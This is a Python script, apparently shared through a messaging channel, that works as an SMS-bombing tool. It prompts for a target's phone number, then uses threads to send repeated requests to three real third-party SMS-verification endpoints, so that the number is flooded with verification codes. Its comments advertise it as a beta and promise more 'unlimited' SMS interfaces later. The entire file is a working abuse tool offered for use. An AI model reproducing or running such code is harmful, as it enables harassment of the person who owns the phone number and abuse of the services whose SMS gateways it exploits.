
#'频道:@qq_cncom'😭
#我在这个程序里加了一点限制
#使用过度会被封IP
#内测版   后续会增加多个无限制短信接口   并解除限制狂暴启动

import concurrent.futures
import requests
import time

def send_request(url, method, data=None):
    headers = {'Content-Type': 'application/json'} 
    try:
        if method == 'GET':
            response = requests.get(url, headers=headers)
        elif method == 'POST':
            response = requests.post(url, json=data, headers=headers)
        response.raise_for_status() 
        print(f"Received response from {url}: {response.text}")
    except requests.RequestException as e:
        print(f"Error sending request to {url}: {e}")

phone = input("手机号：")

interfaces = [
    {
        "url": "https://ay.ecolovo.com/gateway/auth/smsCode?phone={phone}&appCode=HELPER",
        "method": "GET"
    },
    {
        "url": "https://factory.ecoaiya.com/api/auth/n/login/sms", 
        "method": "POST",
        "data": {"appCode":"APPLET","client":"WX_MP","mobile": phone}  
    },
    {
        "url": "https://mall.ecoaiya.com//api/auth/smsCode",
        "method": "POST",
        "data": {"appCode":"MALL","client":"MP","mobile": phone}
    }
]

def send_requests_for_interface(interface, repeat_times):
    for _ in range(repeat_times):
        for _ in range(3): 
            send_request(interface["url"], interface["method"], interface["data"] if "data" in interface else None)
            time.sleep(1 / 9)  
        time.sleep(1 - (repeat_times - 1) / 9)  
        
def main():
    total_rounds = int(input("请输入要重复整个请求发送过程的轮数（整数）："))
    for round_num in range(total_rounds):
        repeat_times = int(input(f"第{round_num+1}轮：请输入每个接口要重复发送请求的次数（整数）："))
        with concurrent.futures.ThreadPoolExecutor(max_workers=9) as executor:
            for interface in interfaces:
                executor.submit(send_requests_for_interface, interface, repeat_times)
                
        if round_num < total_rounds - 1:
            continue_question = input(f"第{round_num+1}轮已完成，是否继续下一轮？（1/2）")        
            if continue_question.lower() != '1':
                break
                
if __name__ == "__main__":
    main()

print('程序制作者:@anchun_cn')
print('频道:@qq_cncom')
#'频道:@qq_cncom'😭